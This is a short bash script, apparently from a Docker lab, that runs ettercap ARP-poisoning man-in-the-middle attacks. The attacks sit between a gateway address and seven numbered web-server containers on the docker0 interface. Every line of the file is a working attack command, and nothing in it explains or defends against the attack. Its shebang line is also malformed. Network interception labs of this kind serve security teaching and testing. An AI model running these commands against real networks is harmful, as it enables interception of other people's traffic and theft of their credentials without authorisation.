#/bin/bash

# Perform an ARP Poisoning Attack on Web Server 1
sudo ettercap -T -S -i docker0 -M arp:remote /172.17.0.1// /172.17.0.2//

# Perform an ARP Poisoning Attack on Web Server 2
sudo ettercap -T -S -i docker0 -M arp:remote /172.17.0.1// /172.17.0.3//

# Perform an ARP Poisoning Attack on Web Server 3
sudo ettercap -T -S -i docker0 -M arp:remote /172.17.0.1// /172.17.0.4//

# Perform an ARP Poisoning Attack on Web Server 4
sudo ettercap -T -S -i docker0 -M arp:remote /172.17.0.1// /172.17.0.5//

# Perform an ARP Poisoning Attack on Web Server 5
sudo ettercap -T -S -i docker0 -M arp:remote /172.17.0.1// /172.17.0.6//

# Perform an ARP Poisoning Attack on Web Server 6
sudo ettercap -T -S -i docker0 -M arp:remote /172.17.0.1// /172.17.0.7//

# Perform an ARP Poisoning Attack on Web Server 7
sudo ettercap -T -S -i docker0 -M arp:remote /172.17.0.1// /172.17.0.8//
